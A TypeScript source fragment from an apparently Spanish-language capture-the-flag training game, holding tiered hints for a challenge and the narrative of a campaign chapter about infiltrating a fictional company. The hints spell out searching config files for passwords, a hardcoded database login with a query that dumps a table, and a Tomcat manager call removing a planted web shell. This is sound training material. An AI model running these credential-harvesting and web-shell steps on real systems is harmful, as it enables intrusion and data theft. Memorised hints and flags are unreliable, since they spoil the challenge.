        level: 1,
        cost: 45,
        text: "Busca credenciales: grep -r 'password' /opt/nexcorp/ --include='*.properties'. Encontrarás las credenciales PostgreSQL en application.properties.",
      },
      {
        level: 2,
        cost: 90,
        text: "Credenciales BD: nexcorp_admin / L4z4rus_DB_P4ss! Conéctate: psql -h localhost -U nexcorp_admin -d nexcorp_db -c \"SELECT * FROM classified_ops WHERE timestamp > NOW() - INTERVAL '30 days'\"",
      },
      {
        level: 3,
        cost: 157,
        text: "El campo operation_id del último registro de classified_ops contiene la flag HACKQUEST{...}. Tras extraerla: curl -k -u tomcat:s3cret 'https://10.10.14.87:8443/manager/text/undeploy?path=/shell' para limpiar.",
      },
    ],
  },
];

// ============================================================
// Chapter 1 export
// ============================================================

export const campaignChapter1: CampaignChapter = {
  slug: "chapter-1-la-brecha",
  title: "Capítulo 1: La Brecha",
  subtitle: "Infiltración en NEXCORP Industries",
  orderIndex: 1,
  branch: "CAMPAIGN",
  requiredRank: "SCRIPT_KIDDIE",

  narrative: `
AÑO 2031. La era de la soberanía digital ha llegado.

Los datos personales de los ciudadanos europeos valen más que el petróleo.
Gobiernos, corporaciones y actores de amenaza estatales compiten en una guerra
silenciosa por el control de la información.

NEXCORP Industries se presenta al mundo como una empresa de "gestión de infraestructura de datos".
Sus oficinas están en Frankfurt. Sus clientes, en los papeles, son empresas Fortune 500.

Pero UNIDAD KRYPTOS —la división de inteligencia digital de la Coalición Europea—
ha interceptado comunicaciones cifradas que revelan la verdad:

NEXCORP gestiona el PROYECTO LAZARUS.
Un sistema de comercio ilegal de datos biométricos robados: rostros, huellas,
patrones de iris. Datos de 2.3 millones de ciudadanos europeos vendidos al mejor postor.

La evidencia está en sus servidores. Protegida por capas de seguridad.
Pero hemos encontrado una grieta.

Tú eres el agente que se introduce por esa grieta.

Tienes cuatro misiones. Cada una te lleva más adentro.
Al final, la evidencia que extraigas hundirá a NEXCORP.

La operación se llama LA BRECHA.
Comienza ahora.
  `.trim(),

  challenges: chapter1Challenges,
};

// Also export the individual challenges for standalone use
export { chapter1Challenges };
